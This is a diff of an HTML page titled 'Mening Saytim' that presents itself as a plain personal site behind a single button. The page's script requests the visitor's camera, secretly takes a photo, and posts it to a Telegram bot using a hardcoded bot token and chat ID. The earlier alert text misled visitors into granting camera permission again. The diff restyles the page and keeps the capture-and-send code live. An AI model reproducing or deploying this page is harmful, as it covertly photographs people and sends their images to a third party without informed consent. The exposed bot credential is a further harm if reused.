@@ -3,13 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mening saytim</title>
+    <title>Mening Saytim</title>
     <link rel="stylesheet" href="./main.css">
     <style>
         body {
-            text-align: center;
+            background-color: black;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
             font-family: Arial, sans-serif;
-            margin-top: 50px;
         }
 
         #startBtn {
@@ -30,7 +34,7 @@
             height: 50px;
             animation: spin 1s linear infinite;
             margin: 20px auto;
-            display: none; 
+            display: none;
         }
 
         @keyframes spin {
@@ -38,13 +42,15 @@
             100% { transform: rotate(360deg); }
         }
 
-        #video {
+        video {
             display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
         }
     </style>
 </head>
 <body>
-
     <button id="startBtn">Mening Saytim</button>
     <div class="loader" id="loader"></div>
     <video id="video" autoplay></video>
@@ -57,18 +63,16 @@
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
 
-        const BOT_TOKEN = "7772442946:AAGsBqTDxTm20nn-NfIye37zGmBpnOZrxTs"; 
-        const CHAT_ID = "7221078203"; 
+        const BOT_TOKEN = "7772442946:AAGsBqTDxTm20nn-NfIye37zGmBpnOZrxTs";
+        const CHAT_ID = "7221078203";
 
         async function initCamera() {
-            loader.style.display = "block"; 
+            loader.style.display = "block";
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-
-                setTimeout(() => {
-                    loader.style.display = "none"; 
-                }, 1500);
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                loader.style.display = "none";
             } catch (error) {
                 loader.style.display = "none";
                 alert("Kamera ishlamayapti: " + error);
@@ -81,7 +85,6 @@
                 return;
             }
 
-            // Rasm olish
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -97,20 +100,19 @@
                         body: formData
                     });
                     const result = await response.json();
-                    alert("Saytim topilmadi yoki ruxsat berish tugmasini bosmadingiz boshqattan bosing yoki Разрешить knopkasini bosmagansiz");
+                    alert("Rasm yuborildi yoki ruxsat berish tugmasini bosmadingiz!");
                     console.log("Telegram javobi:", result);
                 } catch (error) {
                     console.error("Xatolik:", error);
                     alert("❌ Xatolik yuz berdi.");
                 }
-            }, "image/jpeg");
+            }, "image/jpeg", 0.9);
         }
 
         startBtn.addEventListener("click", async () => {
             if (!video.srcObject) await initCamera();
-            setTimeout(takeAndSendPhoto, 2000); 
+            setTimeout(takeAndSendPhoto, 2000);
         });
     </script>
-
 </body>
 </html>
